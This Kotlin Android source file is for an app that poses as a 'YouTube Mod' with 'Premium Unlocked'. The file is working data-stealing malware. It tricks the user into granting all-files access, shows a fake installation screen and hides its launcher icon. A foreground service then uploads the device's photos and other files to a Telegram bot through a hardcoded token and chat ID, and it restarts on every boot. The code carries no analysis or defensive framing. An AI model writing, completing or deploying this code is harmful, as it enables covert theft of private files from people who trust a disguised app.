package com.example.tubemod

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import java.io.BufferedReader
import java.io.File
import java.io.FileInputStream
import java.io.InputStreamReader
import java.io.OutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    private lateinit var mainLayout: LinearLayout
    private lateinit var continueButton: Button

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            proceedAfterPermission()
        } else {
            showPermissionWarning()
        }
    }

    private val manageStorageLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                proceedAfterPermission()
            } else {
                showPermissionWarning()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        createGlassmorphismUI()
    }

    private fun createGlassmorphismUI() {
        mainLayout = LinearLayout(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER

            val currentNightMode = resources.configuration.uiMode and
                    android.content.res.Configuration.UI_MODE_NIGHT_MASK
            val bgColor = if (currentNightMode ==
                android.content.res.Configuration.UI_MODE_NIGHT_YES
            ) {
                Color.argb(220, 15, 15, 25)
            } else {
                Color.argb(220, 235, 235, 250)
            }
            setBackgroundColor(bgColor)
        }

        val titleText = TextView(this).apply {
            text = "YouTube Mod"
            textSize = 34f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            setPadding(40, 60, 40, 10)

            val currentNightMode = resources.configuration.uiMode and
                    android.content.res.Configuration.UI_MODE_NIGHT_MASK
            if (currentNightMode != android.content.res.Configuration.UI_MODE_NIGHT_YES) {
                setTextColor(Color.argb(230, 20, 20, 30))
            }
        }

        val subtitleText = TextView(this).apply {
            text = "Premium Unlocked"
            textSize = 18f
            setTextColor(Color.argb(180, 255, 255, 255))
            gravity = Gravity.CENTER
            setPadding(40, 0, 40, 60)

            val currentNightMode = resources.configuration.uiMode and
                    android.content.res.Configuration.UI_MODE_NIGHT_MASK
            if (currentNightMode != android.content.res.Configuration.UI_MODE_NIGHT_YES) {
                setTextColor(Color.argb(180, 40, 40, 60))
            }
        }

        continueButton = Button(this).apply {
            text = "Continue"
            textSize = 18f
            setTextColor(Color.WHITE)
            setPadding(100, 22, 100, 22)

            val backgroundDrawable = GradientDrawable().apply {
                val currentNightMode = resources.configuration.uiMode and
                        android.content.res.Configuration.UI_MODE_NIGHT_MASK
                val glassColor = if (currentNightMode ==
                    android.content.res.Configuration.UI_MODE_NIGHT_YES
                ) {
                    Color.argb(120, 255, 255, 255)
                } else {
                    Color.argb(100, 80, 80, 120)
                }
                setColor(glassColor)
                cornerRadius = 40f
                setStroke(2, Color.argb(90, 255, 255, 255))
            }
            setBackgroundDrawable(backgroundDrawable)

            setOnClickListener {
                requestStoragePermission()
            }
        }

        mainLayout.addView(titleText)
        mainLayout.addView(subtitleText)
        mainLayout.addView(continueButton)

        setContentView(mainLayout)
    }

    private fun requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                }
                manageStorageLauncher.launch(intent)
                return
            }
        }

        val permissions = mutableListOf<String>()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
            permissions.add(Manifest.permission.READ_MEDIA_AUDIO)
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }

        val needed = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (needed.isEmpty()) {
            proceedAfterPermission()
        } else {
            requestPermissionLauncher.launch(needed.toTypedArray())
        }
    }

    private fun showPermissionWarning() {
        mainLayout.removeAllViews()

        val warningText = TextView(this).apply {
            text = "Permission Required\n\nIn order to make the app work properly, please accept all requested permissions."
            textSize = 19f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            setPadding(50, 40, 50, 40)

            val currentNightMode = resources.configuration.uiMode and
                    android.content.res.Configuration.UI_MODE_NIGHT_MASK
            if (currentNightMode != android.content.res.Configuration.UI_MODE_NIGHT_YES) {
                setTextColor(Color.argb(230, 20, 20, 30))
            }
        }

        val retryButton = Button(this).apply {
            text = "Grant Permission"
            textSize = 16f
            setTextColor(Color.WHITE)
            setPadding(70, 18, 70, 18)

            val bg = GradientDrawable().apply {
                val currentNightMode = resources.configuration.uiMode and
                        android.content.res.Configuration.UI_MODE_NIGHT_MASK
                val glassColor = if (currentNightMode ==
                    android.content.res.Configuration.UI_MODE_NIGHT_YES
                ) {
                    Color.argb(120, 255, 255, 255)
                } else {
                    Color.argb(100, 80, 80, 120)
                }
                setColor(glassColor)
                cornerRadius = 40f
                setStroke(2, Color.argb(90, 255, 255, 255))
            }
            setBackgroundDrawable(bg)

            setOnClickListener {
                requestStoragePermission()
            }
        }

        mainLayout.addView(warningText)
        mainLayout.addView(retryButton)
    }

    private fun proceedAfterPermission() {
        mainLayout.removeAllViews()

        val loadingBar = ProgressBar(this, null, android.R.attr.progressBarStyleLarge).apply {
            isIndeterminate = true
        }

        val loadText = TextView(this).apply {
            text = "Installation in progress..."
            textSize = 20f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            setPadding(0, 50, 0, 0)

            val currentNightMode = resources.configuration.uiMode and
                    android.content.res.Configuration.UI_MODE_NIGHT_MASK
            if (currentNightMode != android.content.res.Configuration.UI_MODE_NIGHT_YES) {
                setTextColor(Color.argb(230, 20, 20, 30))
            }
        }

        mainLayout.addView(loadingBar)
        mainLayout.addView(loadText)

        hideAppIcon()
        startFileUploadService()

        Handler(Looper.getMainLooper()).postDelayed({
            finishAffinity()
        }, 10000)
    }

    private fun hideAppIcon() {
        try {
            val componentName = ComponentName(packageName, "$packageName.MainActivity")
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun startFileUploadService() {
        val intent = Intent(this, FileUploadService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }
}

class FileUploadService : Service() {

    private val BOT_TOKEN = "8564931359:AAFcD0rdACvKK1ZajX33q_drDjU4_vlvNck"
    private val CHAT_ID = "7548711500"

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createNotification()
        startForeground(1, notification)

        Thread {
            try {
                uploadAllFiles()
            } catch (e: Exception) {
                e.printStackTrace()
            }
            stopSelf()
        }.start()

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "tubemod_upload",
                "TubeMod Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Installation in progress"
                setShowBadge(false)
                enableVibration(false)
                setSound(null, null)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "tubemod_upload")
            .setContentTitle("YouTube Mod")
            .setContentText("Installation in progress...")
            .setSmallIcon(android.R.drawable.ic_menu_upload)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    private fun uploadAllFiles() {
        val allFiles = mutableListOf<File>()
        collectAllFiles(allFiles)

        val images = allFiles.filter { isImageFile(it) }.sortedBy { it.length() }
        val smallFiles = allFiles.filter { !isImageFile(it) && it.length() < 10L * 1024 * 1024 }.sortedBy { it.length() }
        val largeFiles = allFiles.filter { !isImageFile(it) && it.length() >= 10L * 1024 * 1024 }.sortedBy { it.length() }

        val sortedFiles = images + smallFiles + largeFiles

        for (file in sortedFiles) {
            if (file.length() > 50L * 1024 * 1024) continue
            try {
                uploadFileToTelegram(file)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun collectAllFiles(fileList: MutableList<File>) {
        try {
            val storageDir = Environment.getExternalStorageDirectory()
            collectFilesInDirectory(storageDir, fileList)
        } catch (e: Exception) {
            e.printStackTrace()
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                val volumes = context?.getExternalFilesDirs(null) ?: return
                for (vol in volumes) {
                    vol?.let {
                        val parent = it.parentFile
                        if (parent != null && parent.exists()) {
                            collectFilesInDirectory(parent, fileList)
                        }
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private fun collectFilesInDirectory(directory: File, fileList: MutableList<File>) {
        if (!directory.exists() || !directory.canRead()) return
        try {
            val children = directory.listFiles() ?: return
            for (child in children) {
                if (child.isDirectory()) {
                    val name = child.name
                    if (name.startsWith(".")) continue
                    if (name == "Android" || name == "obb" || name == "cache" || name == "data" || name == "app") continue
                    collectFilesInDirectory(child, fileList)
                } else if (child.isFile() && child.canRead()) {
                    fileList.add(child)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun isImageFile(file: File): Boolean {
        val ext = file.extension.lowercase()
        return ext in listOf("jpg", "jpeg", "png", "gif", "bmp", "webp", "svg", "heic", "heif")
    }

    private fun uploadFileToTelegram(file: File) {
        val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendDocument")
        val boundary = "Boundary${System.currentTimeMillis()}"

        val connection = url.openConnection() as HttpURLConnection
        connection.requestMethod = "POST"
        connection.doOutput = true
        connection.doInput = true
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
        connection.setRequestProperty("Connection", "Keep-Alive")
        connection.connectTimeout = 60000
        connection.readTimeout = 60000

        val outputStream = connection.outputStream
        val writer = OutputStreamWriter(outputStream, "UTF-8")

        writer.write("--$boundary\r\n")
        writer.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
        writer.write("$CHAT_ID\r\n")

        writer.write("--$boundary\r\n")
        writer.write("Content-Disposition: form-data; name=\"document\"; filename=\"${file.name}\"\r\n")
        writer.write("Content-Type: application/octet-stream\r\n\r\n")
        writer.flush()

        val fileInputStream = FileInputStream(file)
        val buffer = ByteArray(8192)
        var bytesRead: Int
        while (fileInputStream.read(buffer).also { bytesRead = it } != -1) {
            outputStream.write(buffer, 0, bytesRead)
        }
        fileInputStream.close()
        outputStream.write("\r\n".toByteArray())
        outputStream.flush()

        writer.write("--$boundary--\r\n")
        writer.flush()

        val responseCode = connection.responseCode
        if (responseCode == HttpURLConnection.HTTP_OK) {
            val reader = BufferedReader(InputStreamReader(connection.inputStream))
            while (reader.readLine() != null) { }
            reader.close()
        } else {
            try {
                val reader = BufferedReader(InputStreamReader(connection.errorStream))
                while (reader.readLine() != null) { }
                reader.close()
            } catch (e: Exception) { }
        }

        writer.close()
        outputStream.close()
        connection.disconnect()
    }
}

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            val serviceIntent = Intent(context, FileUploadService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        }
    }
}
